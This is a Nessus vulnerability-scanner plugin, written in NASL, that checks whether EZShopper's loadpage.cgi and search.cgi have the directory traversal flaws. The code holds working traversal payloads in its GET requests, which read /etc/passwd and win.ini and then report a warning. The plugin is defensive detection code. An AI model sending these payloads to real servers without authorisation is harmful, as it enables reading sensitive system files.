#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10065);
 script_version ("$Revision: 1.38 $");
 script_cve_id("CVE-2000-0187", "CVE-2000-0188");
 script_bugtraq_id(1014);
 script_osvdb_id(56, 4969);
 
 script_name(english:"EZShopper Multiple Directory Traversal Vulnerabilities");
 script_summary(english:"Tries a directory traversal attack");

 script_set_attribute(attribute:"synopsis", value:
"A web application on the remote host has multiple directory traversal
vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The version of EZShopper running on the remote host has multiple
directory traversal vulnerabilities in loadpage.cgi and search.cgi.
A remote attacker could exploit this to read sensitive information
from the server.

There is also an arbitrary command execution vulnerability in this
version of EZShopper, though Nessus has not checked for that issue." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2000/Feb/437"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/02/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/02/27");
 script_cvs_date("$Date: 2016/11/19 01:42:50 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 if(is_cgi_installed3(item:dir+"/loadpage.cgi", port:port))
 {
req = string(dir, "/loadpage.cgi?user_id=1&file=../../../../../../etc/passwd");
rep = http_send_recv3(method:"GET", item:req, port:port);
if(isnull(rep)) exit(0);

if("root:" >< rep[2]){
      security_warning(port);
      exit(0);
      }


req2 = string(dir,"/loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini");
rep2 = http_send_recv3(method:"GET", item:req2, port:port);
if(isnull(rep2)) exit(0);


if("[windows]" >< rep2[2]){
      security_warning(port);
      exit(0);
      }
 }

if(is_cgi_installed3(item:dir+"/search.cgi", port:port))
 {
req3 = string(dir,"/search.cgi?user_id=1&database=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini&template=..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini&distinct=1");
rep3 = http_send_recv3(method:"GET", item:req3, port:port);
if(isnull(rep3)) exit(0);

if("[windows]" >< rep3[2]){
      security_warning(port);
      exit(0);
      }


req4 = string(dir, "/loadpage.cgi?user_id=1&database=../../../../../../etc/passwd&template=../../../../../../../../../etc/passwd&distinct=1");
rep4 = http_send_recv3(method:"GET", item:req4, port:port);
if(isnull(rep4)) exit(0);

if("root:" >< rep4[2]){
      security_warning(port);
      exit(0);
      }
  }   
}
